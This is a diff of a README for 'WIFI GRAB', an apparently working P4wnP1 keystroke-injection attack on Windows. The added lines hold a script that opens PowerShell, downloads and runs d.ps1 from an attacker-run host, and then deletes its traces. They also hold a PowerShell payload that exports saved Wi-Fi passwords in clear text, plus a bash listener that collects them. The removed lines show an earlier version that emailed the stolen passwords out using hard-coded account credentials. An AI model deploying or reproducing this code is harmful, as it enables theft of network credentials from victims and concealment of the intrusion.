@@ -1,46 +1,71 @@
 # WIFI GRAB
 This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment
 
-# Script
-```js
-layout('es');                   // Spanish keyboard layout
-typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
+# Shellscript
+```bash
+#!/bin/bash
 
-// the powershell script and this payload can be found at
-// https://github.com/axel05869/Wifi-Grab
-// --------GUIDE---------
-// download the powershell script.
-// edit and add the required data.
-// copy and paste all the text to notepad and save as anyname.txt.
-// upload the text to: https://cutt.ly/WjnNPa4
-// copy the direct download link.
+# This script has been developed by Ernest Anguera and Isaac Leon
+
+# We create a "web server" with python3 to download the d.ps1 file
+timeout 10 python3 -m http.server 8921
+
+# Downloads the file that contains all wifi passwords
+wget http://172.16.0.2:8213/wifipass.txt
+```
+
+# Script in Javascript
+```js
+llayout('es');            // Spanish keyboard layout
+typingSpeed(10)    // Wait 10ms between keystrokes
+
 delay(500)
 // Opens the Windows Run prompt.
 press("GUI r")
 // Delays 0.2 seconds to give the Run prompt time to open.
-delay(200)
+delay(2000)
 // this command will download the text and save as d.ps1 then run
 // if the script failed to run change the ExecPolicy to Bypass
-type("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1")
-// Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
-// Delay 0.5 seconds to give the UAC prompt time to open.
-delay(500)
-// Presses Alt + Y to bypass UAC.
-press("ALT y")
+type("powershell")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("wget http://172.16.0.1:8921/d.ps1 -o d.ps1")
+delay(100)
+press("ENTER")
+type("./d.ps1")
+delay(1000)
+press("ENTER")
+delay(10000)
+press("CONTROL c")
+delay(1000)
+type("cd ..")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("rmdir wipass")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("S")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("rm d.ps1")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("exit")
+delay(1000)
+press("ENTER")
 ```
 
 The payload used for this script:
-```
-<#
-This script has been developed by Ernest & Isaac
-#>
-
-
+```powershell
 # All the files will be saved in this directory
 $p = "C:\wipass"
 mkdir $p
 cd $p
-
 
 # Get all saved wifi password
 netsh wlan export profile key=clear
@@ -50,29 +75,5 @@ $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSID
 Out-File wifipass.txt -Append -InputObject $a
 }
 
-
-# --------Email the output file---------
-# Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
-# The following lines define the variables to run the script in order to send the wifi credentials to your account.
-$FROM = "eur1p3des@protonmail.com"
-$PASS = "Eur1p3des21"
-$TO = "eur1p3des@tuta.io"
-
-$PC_NAME = "$env:computername"
-$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
-$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
-$ATTACH = "wifipass.txt"
-
-Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
-
-
-# Clear tracks
-rm *.xml
-rm *.txt
-cd ..
-rm wipass
-
-
-# remove payload
-rm d.ps1
+python3 -m http.server 8213
 ```
